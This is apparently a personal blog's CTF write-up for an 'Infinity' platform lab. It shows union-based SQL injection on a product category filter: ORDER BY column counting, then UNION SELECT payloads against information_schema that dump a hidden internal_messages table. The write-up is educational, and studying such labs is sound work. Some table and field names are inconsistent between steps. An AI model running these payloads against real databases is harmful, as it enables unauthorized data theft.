---
layout: post
title: Infinity - SQL Injection - Catalogue
date: 2026-05-20 00:04:00 +0000
categories: [Writeups, Infinity, "SQL Injection"]
tags:
  - Infinity
subtitle: Manipulating POST Parameters for High Score
description: A walkthrough of exploiting a Union-based SQL Injection vulnerability in a broken search feature on Infinity platform. By identifying the correct number of columns and injecting into a POST parameter, we successfully dumped sensitive data from the database.
image: https://infinitylearning-images.s3.eu-west-2.amazonaws.com/Learning-Path-Challenge-Images/Catalogue.webp
tag:
  - Infinity
  - Web_Security
  - SQLI
  - infinity
  - CTF
  - Web
  - HTTP
  - POST
  - SQLi
paginate: true
---

# Infinity — SQL Injection: Catalogue

## Overview

A walkthrough of exploiting a Union-based SQL Injection vulnerability 
in a product catalogue filter on Infinity platform. By using ORDER BY 
to determine column count and UNION SELECT to enumerate internal_messages 
table, we successfully retrieved hidden messages from the database.

**Vulnerability:** Union-based SQL Injection  
**Parameter:** POST body — search field  
**Database:** MariaDB (MySQL)

---

## Step 1: Identify the Input Field

Open the challenge and locate the filter by category input field.

![1](/assets/infinity/SQLI/category/image.png)


---

## Step 2: Test for SQL Injection

Inject a single quote `'` `"` and application not responded so that i try to use union based sqli : 

first let's imagine sql query : 
```sql
SELECT id, name, price FROM products WHERE category = 'electronics'-- -';
```
`--` make every thing after it comment 

---

## Step 3: Determine Number of Columns

Use `Order by` to find how many columns the original query returns. Increment until result doesn't appears.

**1 column** → `electronics' order by 1-- -`

![alt text](/assets/infinity/SQLI/category/image-1.png)

**2 columns** → `electronics' order by 2-- -`

![alt text](/assets/infinity/SQLI/category/image-2.png)

**3 columns** → Success. `electronics' order by 3-- -` and if try 4 it's fail 

![alt text](/assets/infinity/SQLI/category/image-3.png)

![alt text](/assets/infinity/SQLI/category/image-4.png)

 **and that's make sense we have 3 columns**
---

## Step 4: Enumerate the Database

first i needed to know which columns appear when i inject it and i find it's column 2: 
![alt text](/assets/infinity/SQLI/category/image-5.png)


With 3 columns confirmed, extract table names from `information_schema`.

```sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables;-- -
```
I find too many columns after enum it i got the one `internal_messages`


![alt text](/assets/infinity/SQLI/category/image-6.png)
---

## Step 5: Dump Column Names

```sql
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='messages';-- -
```

Columns found: `id`, `message`

![alt text](/assets/infinity/SQLI/category/image-7.png)

---

## Step 6: Dump the Data

```sql
' UNION SELECT 1,message,3 FROM internal_messages;-- -
```

Successfully retrieved the contents of `messages`.

![alt text](/assets/infinity/SQLI/category/image-8.png)

---

## Key Takeaways

- Column count detection is the first real step in any UNION-based attack; don't skip it.
- Reflected column positions tell you exactly where your output will appear — target those.
- `information_schema` is your map — tables first, then columns, then data.

---

Happy Hacking!  


Follow me: [LinkedIn](https://www.linkedin.com/in/t4t4r1s/) · [X](https://x.com/T4T4R1S)

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>


